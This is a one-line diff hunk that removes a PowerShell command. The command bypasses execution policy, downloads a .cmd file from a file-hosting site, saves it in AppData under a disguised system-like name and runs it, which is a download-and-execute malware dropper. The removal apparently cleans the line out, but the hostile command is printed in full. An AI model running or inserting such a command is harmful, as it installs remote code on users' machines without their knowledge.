@@ -1,1 +1,0 @@
-powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest 'https://files.catbox.moe/s6o157.cmd' -OutFile $env:APPDATA\System3cx2rv.cmd; Start-Process $env:APPDATA\System3cx2rv.cmd"
